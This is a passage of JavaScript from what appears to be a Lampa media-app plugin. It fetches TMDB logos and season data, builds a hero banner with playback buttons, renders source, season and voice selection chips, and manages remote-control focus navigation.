    var id = tmdbId(card);
    if (!id) return [];

    var kind = tmdbKind(card);
    var lang = logoLang();
    var langs = lang === 'en' ? 'en,null' : lang + ',en,null';
    var kinds = kind === 'tv' ? ['tv', 'movie'] : ['movie', 'tv'];
    var out = [];

    kinds.forEach(function (which) {
      [langs, ''].forEach(function (filter) {
        var url = '';
        try {
          url = Lampa.TMDB.api(which + '/' + id + '/images?api_key=' + Lampa.TMDB.key() +
            (filter ? '&include_image_language=' + filter : ''));
        } catch (e) {
          url = '';
        }
        if (url && out.indexOf(url) === -1) out.push(url);
      });
    });

    return out;
  }

  function logoFetch(target, done) {
    var card = target || movie;
    if (!logoOn() || !card || !card.id) return done('');

    var cache_key = logoKey(card);
    if (typeof LOGO_MEM[cache_key] === 'string') return done(LOGO_MEM[cache_key]);

    var entry = logoEntry(cache_key);
    if (logoFresh(entry)) {
      LOGO_MEM[cache_key] = entry.p;
      if (entry.p) logoWarm(entry.p);
      return done(entry.p);
    }

    var urls = logoUrls(card);
    if (!urls.length) return done('');

    var at = 0;
    var answered = false;

    var finish = function (path) {
      logoRemember(cache_key, path, answered);
      if (path) logoWarm(path);
      done(path || '');
    };

    var step = function () {
      if (at >= urls.length) return finish('');
      var url = urls[at++];
      var net = null;
      try { net = new Lampa.Reguest(); } catch (e) { net = null; }
      if (!net) return finish('');
      try { net.timeout(8000); } catch (e) {}
      net.silent(url, function (answer) {
        var list = answer && typeof answer === 'object' ? answer.logos : null;
        if (list && typeof list.length === 'number') answered = true;
        var path = logoPick(list);
        if (path) return finish(path);
        step();
      }, function () {
        step();
      });
    };

    step();
  }

  function numId(value) {
    if (typeof value === 'number') return value > 0 ? value : 0;
    if (typeof value === 'string' && /^\d+$/.test(value)) return parseInt(value, 10) || 0;
    return 0;
  }

  function tmdbId(target) {
    var card = target || movie;
    if (!card) return 0;
    var source = String(card.source || 'tmdb').toLowerCase();
    var own = (source === 'cub' || source === 'tmdb') ? card.id : 0;
    return numId(own) || numId(card.tmdb_id) || 0;
  }

  function tmdbKind(target) {
    var card = target || movie;
    if (!card) return 'movie';
    var kind = String(card.media_type || card.type || '').toLowerCase();
    if (kind === 'tv' || kind === 'movie') return kind;
    if (card.number_of_seasons || card.number_of_episodes || card.seasons ||
        card.first_air_date || card.last_air_date ||
        card.name || card.original_name) return 'tv';
    if (card === movie && serial) return 'tv';
    return 'movie';
  }

  function seasonPlanned(season, done) {
    var id = tmdbId();
    if (!id || !season) return done(0);

    var key = id + ':' + season;
    var box = cached('nova_plus_season_cache', 300, {});
    if (typeof box[key] === 'number') return done(box[key]);

    var api = null;
    try { api = Lampa.Api.sources.tmdb; } catch (e) { api = null; }
    if (!api || typeof api.get !== 'function') return done(0);

    var keep = function (count) {
      var now = cached('nova_plus_season_cache', 300, {});
      if (now && typeof now === 'object') {
        now[key] = count || 0;
        save('nova_plus_season_cache', now);
      }
      done(count || 0);
    };

    try {
      api.get('tv/' + id + '/season/' + season, {}, function (data) {
        keep((data && data.episodes && data.episodes.length) || 0);
      }, function () {
        done(0);
      });
    } catch (e) {
      done(0);
    }
  }

  function logoSlot() {
    if (!ui.hero) return null;
    var slot = ui.hero.find('.nova-hero__title');
    if (slot.length) return slot;
    slot = ui.hero.find('.nova-hero__mark');
    return slot.length ? slot : null;
  }

  function logoDraw(box, path, name) {
    if (!box) return;
    var src = logoUrl(path);
    if (!src) return box.removeClass('nova-hero__title--logo').text(name);

    var picture = $('<img alt="">');
    picture.on('error', function () {
      box.removeClass('nova-hero__title--logo').text(name);
    });
    picture.attr('src', src);
    box.addClass('nova-hero__title--logo').empty().append(picture);
    logoTone(src, path, function (tone) {
      if (!picture.parent().length) return;
      if (tone === 'invert') picture.addClass('nova-logo--invert');
      else if (tone === 'glow') picture.addClass('nova-logo--glow');
      else if (tone === 'blind') picture.addClass('nova-logo--edge');
    });
  }

  function heroLogo() {
    var slot = logoSlot();
    if (!slot) return;

    var name = movie.title || movie.name || '';
    if (!logoOn()) return slot.removeClass('nova-hero__title--logo').text(name);

    var ready = logoPeek(movie);
    if (ready) return logoDraw(slot, ready, name);

    var want = movie.id;
    logoFetch(movie, function (path) {
      if (!ui.hero || !movie || movie.id !== want) return;
      logoDraw(logoSlot(), path, name);
    });
  }

  function heroStatic(withArt) {
    if (!ui.hero) return;

    if (withArt) {
      var meta = ui.hero.find('.nova-hero__meta').empty();
      var badge = knownQuality(currentSourceKey()) || splitSourceName(sourceTitle()).badge;
      if (badge) meta.append('<div class="nova-badge">' + esc(badge) + '</div>');
      if (movie.vote_average) {
        meta.append('<div>\u2605 ' + parseFloat(movie.vote_average + '').toFixed(1) + '</div>');
      }
      var year = ((movie.release_date || movie.first_air_date || '') + '').slice(0, 4);
      if (year) meta.append('<div>' + esc(year) + '</div>');
      var mins = episodeRuntime();
      if (mins) meta.append('<div>' + esc(runtimeText(mins * 60)) + '</div>');
    }

    var hint = [];
    var source = splitSourceName(sourceTitle()).name;
    if (source) hint.push(source);
    var voice = groups.voice ? groups.voice.subtitle : '';
    if (voice) hint.push(voice);
    ui.hero.find('.nova-hero__hint').text(hint.join(' \u00b7 '));

    ui.hero.find('.nova-hero__progress').empty().hide();
    ui.hero.find('.nova-hero__season').hide();
  }

  function buildHero() {
    if (!heroEnabled()) {
      ui.hero_box.empty();
      ui.hero = null;
      ui.hero_kind = '';
      return null;
    }

    var target = nav ? null : pickResume(items);
    var button = playButton();
    var kind = target ? 'full' : 'static';
    var withArt = artEnabled();

    if (ui.hero && ui.hero_kind !== kind) {
      button.detach();
      nextButton().detach();
      ui.hero_box.empty();
      ui.hero = null;
    }

    if (!ui.hero) {
      ui.hero_kind = kind;
      ui.hero = $('<div class="nova-hero">' +
        (withArt ? '<div class="nova-hero__bg"><img alt=""></div><div class="nova-hero__shade"></div>' : '') +
        '<div class="nova-hero__body">' +
        (withArt ? '<div class="nova-hero__title"></div><div class="nova-hero__meta"></div><div class="nova-hero__descr"></div>' : '') +
        '<div class="nova-hero__actions">' +
        (withArt ? '' : '<div class="nova-hero__mark"></div>') +
        '<div class="nova-hero__hint"></div></div>' +
        '<div class="nova-hero__season" style="display:none"></div>' +
        '</div>' +
        '<div class="nova-hero__progress" style="display:none"></div>' +
        '</div>');

      if (!withArt) ui.hero.addClass('nova-hero--compact');

      if (withArt) {
        ui.hero.find('.nova-hero__title').text(movie.title || movie.name || '');
        ui.hero.find('.nova-hero__descr').text(movie.overview || '');
      }

      heroLogo();

      if (withArt) heroArtDraw(ui.hero);

      ui.hero_box.empty().append(ui.hero);
    }

    if (!target) {
      button.detach();
      nextButton().detach();
      heroStatic(withArt);
      return null;
    }

    ui.hero.find('.nova-hero__actions').prepend(button);

    var started = target.percent > 0 && target.percent < SEEN_PERCENT;
    var next = serial ? nextItem(target) : null;
    var next_button = nextButton();
    if (next && started) {
      next_button.find('.nova-btn__label')
        .text(text('nova_next_episode', 'nova_plus_next_episode') + episodeSuffix(next));
      button.after(next_button);
    } else next_button.detach();

    if (withArt) {
      var meta = ui.hero.find('.nova-hero__meta').empty();
      var badge = shortQuality(target.quality) || splitSourceName(sourceTitle()).badge;
      if (badge) meta.append('<div class="nova-badge">' + esc(badge) + '</div>');
      if (movie.vote_average) {
        meta.append('<div>\u2605 ' + parseFloat(movie.vote_average + '').toFixed(1) + '</div>');
      }
      var year = ((movie.release_date || movie.first_air_date || '') + '').slice(0, 4);
      if (year) meta.append('<div>' + esc(year) + '</div>');
      if (target.time) meta.append('<div>' + esc(target.time) + '</div>');
    }

    var label = started ? text('nova_continue', 'nova_plus_continue') : text('nova_watch', 'nova_plus_watch');
    if (serial && target.numbered) {
      label += ' \u00b7 S' + (seasonNumber() || 1) + ' E' + target.num;
    }
    button.find('.nova-btn__label').text(label);

    var hint = [];
    var source = splitSourceName(sourceTitle()).name;
    if (source) hint.push(source);
    var voice = groups.voice ? groups.voice.subtitle : '';
    if (voice) hint.push(voice);
    ui.hero.find('.nova-hero__hint').text(hint.join(' \u00b7 '));

    wideHeroTune();

    var season = serial && !nav && items.length > 1 ? seasonSeen(items) : null;

    var season_line = ui.hero.find('.nova-hero__season');
    if (season) {
      season_line.text(seasonText(season)).show();

      if (season.planned <= season.total) {
        var want_season = seasonNumber() || 1;
        var want_id = tmdbId();
        seasonPlanned(want_season, function (planned) {
          if (!planned || planned <= season.total) return;
          if (!ui.hero || tmdbId() !== want_id || (seasonNumber() || 1) !== want_season) return;
          var box = ui.hero.find('.nova-hero__season');
          if (!box.length) return;
          season.planned = planned;
          box.text(seasonText(season)).show();
        });
      }
    } else season_line.hide();

    var progress = ui.hero.find('.nova-hero__progress').empty();
    var percent = season
      ? Math.round(season.seen / season.total * 100)
      : Math.min(100, target.percent);
    if (percent > 0) {
      progress.show().append('<div class="time-line"><div style="width:' + percent + '%"></div></div>');
    } else progress.hide();

    return button;
  }

  function uiToggle(key) {
    var opening = ui_open !== key;
    lockRelease();
    ui_open = opening ? key : '';
    ui_focus = key;

    if (opening) {
      if (key === 'source') {
        var list = groups.sort || [];
        var pick = list[0];
        list.forEach(function (item) {
          if (item.selected) pick = item;
        });
        if (pick) ui_focus = focusKey(pick);
      } else if (key === 'season') ui_focus = 'season:' + selectedIndex(groups.season);
      else if (key === 'voice') ui_focus = 'voice:' + selectedIndex(groups.voice);
    }

    buildRows();

    if (opening) {
      var entry = dropEntry();
      var seat = entry ? $(entry).attr('data-nova-focus') : '';
      if (seat) ui_focus = seat;
    }

    if (opening && key === 'source') probeRun();
    else probeStop();

    lockFocus(ui_focus, opening ? 0 : 900);

    restoreFocus(false);
    contentEnable();
    if (opening) dropShowSoon();
  }

  function selectedIndex(group) {
    if (!group || !group.items) return 0;
    for (var i = 0; i < group.items.length; i++) {
      if (group.items[i].selected) return typeof group.items[i].index === 'number' ? group.items[i].index : i;
    }
    return 0;
  }

  function chip(key, value, extra) {
    var box = $('<div class="nova-chip selector"></div>');
    box.attr('data-nova-focus', key);
    if (extra && extra.icon) box.append(extra.icon);
    if (extra && extra.badge) box.append($('<span class="nova-chip__badge"></span>').text(extra.badge));
    box.append($('<span class="nova-chip__label"></span>').text(value || ''));
    if (!(extra && extra.plain)) box.append(ICON.chevron);
    if (extra && extra.active) box.addClass('nova-chip--active');
    if (extra && extra.empty) box.addClass('nova-chip--empty');
    if (extra && extra.num) box.append($('<span class="nova-chip__num"></span>').text(extra.num));
    if (extra && extra.dot) box.append('<span class="nova-chip__dot"></span>');
    return box;
  }

  function markSourceBusy(item) {
    if (!ui.rows) return;
    try {
      var box = ui.rows.find('[data-nova-focus="source"]').first();
      if (!box.length) return;
      var parts = splitSourceName(item.title || '');
      box.addClass('nova-chip--busy');
      box.find('.nova-chip__label').text(parts.name || item.title || '');
      var badge = box.find('.nova-chip__badge');
      var value = knownQuality(item.source || item.title) || parts.badge;
      if (value) {
        if (badge.length) badge.text(value);
        else box.prepend($('<span class="nova-chip__badge"></span>').text(value));
      } else badge.remove();
    } catch (e) {}
  }

  function chooseSource(item) {
    if (wideOn()) return wideChooseSource(item, focusKey(item));
    if (!filter || typeof filter.onSelect !== 'function') return;
    var host_filter = filter;
    ui_open = '';
    note_sig = '';
    buildRows();
    markSourceBusy(item);
    if (ui.list) listHold().empty().append(skeleton(4));
    refreshCollection();
    focusChip('source');
    switchStart('source');
    inplaceStart();
    hopReset();
    probeStop();
    voiceStop();
    hop.tried[item.source || item.title] = true;
    keepAlive(function () {
      host_filter.onSelect('sort', item);
    });
  }

  function chooseOption(group, index) {
    if (!filter || typeof filter.onSelect !== 'function') return;
    var host_filter = filter;
    ui_open = '';
    buildRows();
    if (ui.list) listHold().empty().append(skeleton(4));
    refreshCollection();
    focusChip(group.stype);
    switchStart(group.stype);
    voiceStop();
    keepAlive(function () {
      host_filter.onSelect('filter', { stype: group.stype }, { index: index });
    });
  }

  function openExtra(index) {
    var entry = extras[index];
    if (!entry) return;

    var key = 'extra:' + index;
    if (ui_open === key) return uiToggle(key);

    ui_open = '';
    extra_menu = null;
    captured = null;
    switchStart(key);

    capturing = true;
    try { entry.node.trigger('hover:enter'); } catch (e) {}
    capturing = false;

    if (!captured) return;

    switchDone();
    lockRelease();

    extra_menu = { key: key, params: captured };
    captured = null;
    ui_open = key;

    var at = 0;
    (extra_menu.params.items || []).forEach(function (item, order) {
      if (item && item.selected) at = order;
    });
    ui_focus = key + ':' + at;

    buildRows();
    lockFocus(ui_focus);
    restoreFocus(false);
    contentEnable();
    dropShowSoon();
  }

  function extraRow() {
    var params = extra_menu.params || {};
    var key = extra_menu.key;
    var row = $('<div class="nova-drop"></div>');

    (params.items || []).forEach(function (item, index) {
      var box = chip(key + ':' + index, item.title || item.name || '', {
        active: !!item.selected,
        plain: true
      });
      bind(box, function () {
        if (item.selected) return uiToggle(key);
        ui_open = '';
        buildRows();
        if (ui.list) listHold().empty().append(skeleton(4));
        refreshCollection();
        focusChip(key);
        switchStart(key);
        inplaceStart();
        keepAlive(function () {
          if (typeof params.onSelect === 'function') params.onSelect(item);
        });
      });
      row.append(box);
    });

    ui.rows.append(row);
  }

  function focusChip(key) {
    var chip = ui.rows ? ui.rows.find('.nova-toolbar [data-nova-focus="' + key + '"]').first() : null;
    if (!chip || !chip.length) chip = seek(key);
    if (chip && chip.length) return focusNode(chip);
    return false;
  }

  function sourceActive(item, key, state, graded) {
    if (state === 'empty') return false;
    if (item.selected || state === 'ok') return true;
    if (knownQuality(key)) return true;
    if (item.ghost) return false;
    if (!graded) return true;
    return !!splitSourceName(item.title).badge;
  }

  function sourceRow() {
    var sort = groups.sort || [];
    var probe = probeCache(movie.id).list || {};
    var life = lifeKnown();

    var graded = false;
    sort.forEach(function (item) {
      if (splitSourceName(item.title).badge) graded = true;
    });

    var visible = [];
    var hidden = [];
    sort.forEach(function (item) {
      var key = item.source || item.title;
      var state = probe[key] ? probe[key].s : (life && !item.ghost ? 'ok' : '');
      if (sourceActive(item, key, state, graded)) visible.push(item);
      else hidden.push(item);
    });
    if (ui_all_sources) visible = visible.concat(hidden);

    var row = $('<div class="nova-drop"></div>');

    visible.forEach(function (item, order) {
      var key = item.source || item.title;
      var parts = splitSourceName(item.title);
      var state = probe[key] ? probe[key].s : (life ? (item.ghost ? 'empty' : 'ok') : '');
      var box = chip(focusKey(item), parts.name, {
        badge: knownQuality(key) || parts.badge,
        active: !!item.selected,
        empty: probeShow() && state === 'empty',
        dot: probeShow() && state === 'ok',
        plain: true
      });
      box.attr('data-nova-src', key);
      if (probe_busy && probe_queue[key] && !state && !item.selected) box.addClass('nova-chip--checking');
      bind(box, function () {
        if (item.selected) return uiToggle('source');
        chooseSource(item);
      });
      row.append(box);
    });

    if (!ui_all_sources && hidden.length) {
      var more = chip('src:more', text('nova_more_sources', 'nova_plus_more_sources')
        .replace('{count}', hidden.length), { plain: true });
      more.addClass('nova-chip--more');
      bind(more, function () {
        ui_all_sources = true;
        var want = hidden.length ? focusKey(hidden[0]) : '';
        buildRows();
        if (want && !seek(want)) want = '';
        if (!want) {
          var seat = dropEntry();
          if (seat) want = $(seat).attr('data-nova-focus') || '';
        }
        if (want) lockFocus(want);
        restoreFocus(false);
        contentEnable();
        dropShowSoon();
        probeRun();
      });
      row.append(more);
    }

    ui.rows.append(row);
  }

  function optionRow(group) {
    var order = group.items.map(function (item, index) {
      return { item: item, index: typeof item.index === 'number' ? item.index : index, seat: index };
    });

    if (group.stype === 'voice') {
      order.sort(function (a, b) {
        return (voiceRank(a.item.title) - voiceRank(b.item.title)) || (a.seat - b.seat);
      });
    }

    var plain_season = group.stype === 'season' && !serial;

    var row = $('<div class="nova-drop"></div>');
    order.forEach(function (entry) {
      var box = chip(group.stype + ':' + entry.index,
        plain_season ? partTitle(entry.item.title) : entry.item.title, {
        active: !!entry.item.selected,
        plain: true,
        num: group.stype === 'voice' ? voiceCount(entry.item.title) : 0
      });
      bind(box, function () {
        if (entry.item.selected) return uiToggle(group.stype);
        chooseOption(group, entry.index);
      });
      row.append(box);
    });
    ui.rows.append(row);
  }

  var FIT_STEPS = ['nova-toolbar--tight', 'nova-toolbar--tighter', 'nova-toolbar--clip'];

  function isMobilePortrait() {
    try {
      return window.innerWidth < 600 && window.innerHeight > window.innerWidth;
    } catch (e) {
      return false;
    }
  }

  function fitToolbar(toolbar) {
    toolbar.removeClass(FIT_STEPS.join(' '));

    var node = toolbar[0];
    if (!node) return;

    var mobilePortrait = isMobilePortrait();
    var room = node.clientWidth || 0;

    if (mobilePortrait && extras.length) {
      toolbar.addClass(FIT_STEPS[0]);
      for (var j = 1; j < FIT_STEPS.length; j++) {
        if (node.scrollWidth <= node.clientWidth + 1) return;
        toolbar.addClass(FIT_STEPS[j]);
      }
      return;
    }

    if (!room) {
      if (extras.length) toolbar.addClass(FIT_STEPS[0]);
      return;
    }

    for (var i = 0; i < FIT_STEPS.length; i++) {
      if (node.scrollWidth <= node.clientWidth + 1) return;
      toolbar.addClass(FIT_STEPS[i]);
    }
  }

  function pageTitle(page) {
    var first = items[page.start] ? items[page.start].num : page.start + 1;
    var tail = items[page.end] ? items[page.end].num : page.end + 1;
    return first === tail ? String(first) : first + '\u2013' + tail;
  }

  function jumpRow() {
    var list = pages(items.length);
    var row = $('<div class="nova-drop"></div>');
    list.forEach(function (page) {
      var box = chip('jump:' + page.start, pageTitle(page), {
        active: page.start === ui_page,
        plain: true
      });
      bind(box, function () {
        showPage(page.start, page.start);
      });
      row.append(box);
    });
    ui.rows.append(row);
  }

  function buildRows() {
    if (wideOn()) return wideRows();

    var rows = ui.rows.empty();
    var toolbar = $('<div class="nova-toolbar' + (modeWide() ? ' nova-plus__bar' : '') + '"></div>');
    chip_actions = {};

    var addChip = function (key, title, value, extra) {
      if (title) toolbar.append($('<div class="nova-toolbar__label"></div>').text(title));
      var box = chip(key, value, extra);
      if (ui_open === key) box.addClass('nova-chip--active');
      chip_actions[key] = {
        enter: extra && extra.action ? extra.action : function () { uiToggle(key); },
        long: extra && extra.long ? extra.long : null
      };
      bind(box, chip_actions[key].enter, chip_actions[key].long);
      toolbar.append(box);
    };

    extras.forEach(function (entry, index) {
      var origin = entry.node;
      addChip('extra:' + index, entry.label, entry.value, {
        action: function () { openExtra(index); },
        long: function () {
          try { origin.trigger('hover:long'); } catch (e) {}
        }
      });
    });

    var sort = groups.sort || [];
    if (sort.length) {
      var parts = splitSourceName(sourceTitle());
      var current = null;
      sort.forEach(function (item) {
        if (item.selected) current = item;
      });
      var key = current ? (current.source || current.title) : '';
      addChip('source', modeWide() ? '' : text('nova_source', 'nova_plus_source'), parts.name, {
        badge: knownQuality(key) || parts.badge
      });
    }

    if (groups.season && groups.season.items.length > 1) {
      if (serial) {
        addChip('season', groups.season.title || text('torrent_serial_season', 'nova_plus_season'),
          groups.season.subtitle || '', {});
      } else {
        addChip('season', text('nova_playlist', 'nova_plus_playlist'),
          partTitle(groups.season.subtitle), {});
      }
    }

    if (groups.voice && groups.voice.items.length > 0) {
      addChip('voice', groups.voice.title || text('torrent_parser_voice', 'nova_plus_voice'),
        groups.voice.subtitle || groups.voice.items[0].title || '', {});
    }

    if (!nav && items.length > JUMP_FROM) {
      var now = pageAt(pages(items.length), ui_page > 0 ? ui_page : 0);
      addChip('jump', serial
        ? text('nova_jump', 'nova_plus_jump')
        : text('nova_files', 'nova_plus_files'), pageTitle(now), {});
    }

    rows.append(toolbar);
    fitToolbar(toolbar);

    if (ui_open === 'source') sourceRow();
    else if (ui_open === 'season' && groups.season) optionRow(groups.season);
    else if (ui_open === 'voice' && groups.voice) optionRow(groups.voice);
    else if (ui_open === 'jump') jumpRow();
    else if (extra_menu && ui_open === extra_menu.key) extraRow();
  }

  function focusNode(target, gentle) {
    if (!target) return false;
    var node = target instanceof jQuery ? target[0] : target;
    if (!node) return false;
    if (!alive(node)) return false;
    if (gentle) gentleMark();
    last = node;
    ui_focus = node.getAttribute ? (node.getAttribute('data-nova-focus') || '') : '';
    scrollTo(node, gentle || chipSeat(node));
    focusing = true;
    try { Lampa.Controller.collectionFocus(node, host); } catch (e) {}
    focusing = false;
    return true;
  }

  function seek(key) {
    if (!key || !ui.root) return null;
    var found = ui.root.find('[data-nova-focus="' + key + '"]').first();
    return found.length ? found : null;
  }

  function restoreFocus(fallback) {
    gentleMark();
    refreshCollection();
    if (lockActive()) {
      var locked = seek(ui_lock);
      if (locked) return focusNode(locked, true);
      if (focusChip(ui_lock)) return true;
    }
    var wanted = seek(ui_focus);
    if (wanted) return focusNode(wanted, true);
    if (preselectPage(ui_focus)) return true;
    if (fallback) return focusNode(fallback, true);
    if (ui_open) {
      var seat = dropEntry();
      if (seat) return focusNode(seat, true);
    }
    var chip = ui.rows.find('.nova-chip').first();
    if (chip.length) return focusNode(chip, true);
    return false;
  }

  function keyIndex(key) {
    if (!key || String(key).indexOf('item:') !== 0) return -1;
    var index = parseInt(String(key).slice(5), 10);
    if (isNaN(index) || index < 0 || index >= items.length) return -1;
    return index;
  }

  function preselectPage(key) {
    var index = keyIndex(key);
    if (index < 0) return false;
    var item = items[index];
    if (!item || (item.card && item.card.length)) return false;
    if (items.length <= JUMP_FROM) return false;
    var page = pageAt(pages(items.length), index);
    if (page.start === ui_page) return false;
    lockRelease();
    ui_open = '';
    ui_focus = '';
    ui_page = page.start;
    ui_page_focus = index;
    setTimeout(redraw, 0);
    return true;
  }

  function alive(node) {
    var elem = node instanceof jQuery ? node[0] : node;
    if (!elem) return false;
    try {
      return !!(document.body && document.body.contains(elem));
    } catch (e) {
      return false;
    }
  }

  function refreshCollection() {
    if (!host || !alive(host)) return;
    try { Lampa.Controller.collectionSet(host, false, true); } catch (e) {}
  }

  function inSkin() {
    if (!ui.root || !ui.root[0] || !alive(ui.root[0])) return false;
    if (!host || !alive(host) || !$.contains(host, ui.root[0])) return false;
    var live = activeNode();
    if (live && live !== ui.root[0] && !$.contains(live, ui.root[0])) return false;
    return true;
  }

  function toolbarFocused() {
    if (!inSkin() || !last) return false;
    return ui.rows.find('.nova-toolbar').find(last).length > 0;
  }

  function rowsFocused() {
    if (!inSkin() || !last) return false;
    return ui.rows.find(last).length > 0;
  }

  function listFocused() {
    if (!inSkin() || !last) return false;
    return ui.list.find(last).length > 0;
  }

  function toolbarFocus() {
    if (!inSkin()) return false;
    var chip = ui.rows.find('.nova-toolbar [data-nova-focus="source"]').first();
    if (!chip.length) chip = ui.rows.find('.nova-toolbar .nova-chip').first();
    if (!chip.length) return false;
    return focusNode(chip);
  }

  function layoutReady() {
    try {
      return document.body.offsetWidth > 0 || document.body.offsetHeight > 0;
    } catch (e) {
      return false;
    }
  }

  function shown(node) {
    var elem = node instanceof jQuery ? node[0] : node;
    if (!elem) return false;
    try {
      if (!$.contains(document.body, elem)) return false;
      if (!layoutReady()) return true;
      if (elem.offsetWidth <= 0 && elem.offsetHeight <= 0) return false;
      return elem.offsetParent !== null;
    } catch (e) {
      return true;
    }
  }

  function resumeTarget() {
    var resume = pickResume(items);
    if (!resume) return null;
    if (resume.card && resume.card.length && shown(resume.card)) return resume.card;
    if (preselectPage('item:' + resume.index)) return true;
    return null;
  }

  function keepFocus() {
    if (!inSkin()) return false;
    refreshCollection();
    var wanted = lockActive() ? seek(ui_lock) : null;
    if (!wanted) wanted = seek(ui_focus);
    if (wanted && !shown(wanted)) wanted = null;
    if (!wanted && last && $.contains(ui.root[0], last) && shown(last)) wanted = $(last);
    if (!wanted && preselectPage(ui_focus)) return true;
    if ((!wanted || !wanted.length) && ui_open) {
      var entry = dropEntry();
      if (entry) wanted = $(entry);
    }
    if (!wanted || !wanted.length) {
      if (ui.play && ui.play.length && ui.play.parent().length && shown(ui.play)) wanted = ui.play;
      else {
        var fallback = resumeTarget();
        if (fallback === true) return true;
        wanted = fallback || ui.list.find('.nova-card.selector').first();
      }
    }
    if (!wanted || !wanted.length) return false;
    if (!$.contains(ui.root[0], wanted[0])) return false;
    return focusNode(wanted);
  }

  function dropFocused() {
    if (wideOn()) return rowsFocused();
    if (!inSkin() || !last) return false;
    var row = ui.rows.find('.nova-drop');
    return !!(row.length && row.find(last).length);
  }

  function dropItems() {
    if (wideOn()) return wideItems();
    if (!inSkin()) return [];
    var row = ui.rows.find('.nova-drop');
    if (!row.length) return [];
    var out = [];
    row.find('.selector').each(function () {
      if (shown(this)) out.push(this);
    });
    return out;
  }

  function rowStep(dir) {
    var nodes = dropItems();
    if (!nodes.length || !last) return null;
    var from = last.getBoundingClientRect();
    if (!from.width && !from.height) return null;
    var mid = from.left + from.width / 2;
    var tol = Math.max(6, from.height / 2);
    var line = null;
    var i, box, edge, dist;
    for (i = 0; i < nodes.length; i++) {
      if (nodes[i] === last) continue;
      box = nodes[i].getBoundingClientRect();
      if (!box.width && !box.height) continue;
      if (dir === 'up') {
        if (box.bottom > from.top + tol) continue;
        if (line === null || box.bottom > line) line = box.bottom;
      } else {
        if (box.top < from.bottom - tol) continue;
        if (line === null || box.top < line) line = box.top;
      }
    }
    if (line === null) return null;
    var best = null;
    var gap = 0;
    for (i = 0; i < nodes.length; i++) {
      if (nodes[i] === last) continue;
      box = nodes[i].getBoundingClientRect();
      if (!box.width && !box.height) continue;
      edge = dir === 'up' ? box.bottom : box.top;
      if (Math.abs(edge - line) > tol) continue;
      dist = Math.abs(box.left + box.width / 2 - mid);
      if (best === null || dist < gap) {
        best = nodes[i];
        gap = dist;
      }
    }
    return best;
  }

  function dropEntry() {
    if (wideOn()) {
      var seat = wideEntry();
      if (seat) return seat;
    }
    var nodes = dropItems();
    if (!nodes.length) return null;

    var top = null;
    var i, box;
    for (i = 0; i < nodes.length; i++) {
      box = nodes[i].getBoundingClientRect();
      if (top === null || box.top < top) top = box.top;
    }

    function onTop(node) {
      var rect = node.getBoundingClientRect();
      if (!(rect.width || rect.height)) return true;
      return rect.top - top <= Math.max(6, rect.height / 2);
    }

    var active = ui.rows.find('.nova-drop .nova-chip--active')[0];
    if (active && shown(active) && onTop(active)) return active;

    for (i = 0; i < nodes.length; i++) {
      if (onTop(nodes[i])) return nodes[i];
    }
    return nodes[0];
  }

  function dropDown() {
    if (!inSkin() || !ui_open) return false;
    if (dropFocused()) {
      var below = rowStep('down');
      return below ? focusNode(below) : false;
    }
    if (!toolbarFocused()) return false;
    var entry = dropEntry();
    return entry ? focusNode(entry) : false;
  }

  function dropOwner() {
    if (!inSkin() || !ui_open) return null;
    var bar = ui.rows.find('.nova-toolbar');
    var chip = bar.find('[data-nova-focus="' + ui_open + '"]').first();
    if (!chip.length) chip = bar.find('.nova-chip--active').first();
    if (!chip.length) chip = bar.find('.nova-chip').first();
    return chip.length ? chip : null;
  }

  function heroFocused() {
    if (!inSkin() || !last) return false;
    return !!(ui.hero_box && ui.hero_box.find(last).length);
  }

  function dropUp() {
    if (!dropFocused() || !ui_open) return false;
    var above = rowStep('up');
    if (above) return focusNode(above);
    var chip = dropOwner();
    if (!chip) return false;
    return focusNode(chip);
  }

  function novaUp() {
    if (wideOn()) return wideUp();
    if (!inSkin()) return false;
    if (dropUp()) return true;
    try {
      if (window.Navigator && window.Navigator.canmove('up')) return false;
    } catch (e) {}

    if (rowsFocused()) {
      if (ui.play && ui.play.length && ui.play.parent().length) {
        lockRelease();
        return focusNode(ui.play);
      }
      return false;
    }
    if (listFocused()) {
      lockRelease();
      return toolbarFocus();
    }
    return false;
  }

  function novaDown() {
    if (wideOn()) return wideDown();
    if (!inSkin()) return false;
    if (dropDown()) return true;
    if (ui_open) {
      if (heroFocused()) {
        var owner = dropOwner();
        if (owner) return focusNode(owner);
      }
      return false;
    }
    if (!toolbarFocused() || items.length < 2) return false;
    lockRelease();
    var target = pickResume(items);
    if (target && target.card && target.card.length) return focusNode(target.card);
    return false;
  }

  function dropSide(dir) {
    var nodes = dropItems();
    if (!nodes.length || !last) return null;
    var at = -1;
    for (var i = 0; i < nodes.length; i++) {
      if (nodes[i] === last) {
        at = i;
        break;
      }
    }
    if (at === -1) return null;
    var next = dir === 'left' ? at - 1 : at + 1;
    if (next < 0 || next >= nodes.length) return null;
    return nodes[next];
  }

  function novaRight() {
    if (wideOn()) return wideSide('right');
    if (!inSkin()) return false;
    try {
      if (window.Navigator && window.Navigator.canmove('right')) return false;
    } catch (e) {}
    if (ui_open && dropFocused()) {
      var ahead = dropSide('right');
      if (ahead) return focusNode(ahead);
      return true;
    }
    return toolbarFocus();
  }

  function novaLeft() {
    if (wideOn()) return wideSide('left');
    if (!inSkin()) return false;
    try {
      if (window.Navigator && window.Navigator.canmove('left')) return false;
    } catch (e) {}
    if (!ui_open) return false;
    if (dropFocused()) {
      var back = dropSide('left');
      if (back) return focusNode(back);
      return true;
    }
    return false;
  }

  function nativeState() {
    var empty = $(host).find(nativeOnlineSelector('.online-empty')).not(nativeOnlineSelector('.nova-plus-root .online-empty')).first();
    if (!empty.length) return null;
    if (empty.find('.broadcast__scan').length && !empty.find(nativeOnlineSelector('.online-empty__title')).length) {
      return { kind: 'loading', node: empty };
    }
    return { kind: 'note', node: empty };
  }

  var KNOWN_KEY = 'nova_plus_components';

  function knownList() {
    var box = get(KNOWN_KEY, []);
    return Object.prototype.toString.call(box) === '[object Array]' ? box : [];
  }

  function knownRemember() {
    var name = '';
    try {
      var current = Lampa.Activity.active();
      name = String((current && current.component) || '');
    } catch (e) {
      name = '';
    }
    if (!name) return;
    var box = knownList();
    if (box.indexOf(name) !== -1) return;
    box.push(name);
    if (box.length > 20) box.shift();
    save(KNOWN_KEY, box);
  }

  function knownNow() {
    var name = '';
    try {
      var current = Lampa.Activity.active();
      name = String((current && current.component) || '');
    } catch (e) {
      name = '';
    }
    if (!name) return false;
    return knownList().indexOf(name) !== -1;
  }

  function blank() {
    if (!root || !host) return false;
    if (!knownNow()) return false;
    var body = $(host).children().not('.nova-plus-root').not('.nova-plus-hidden');
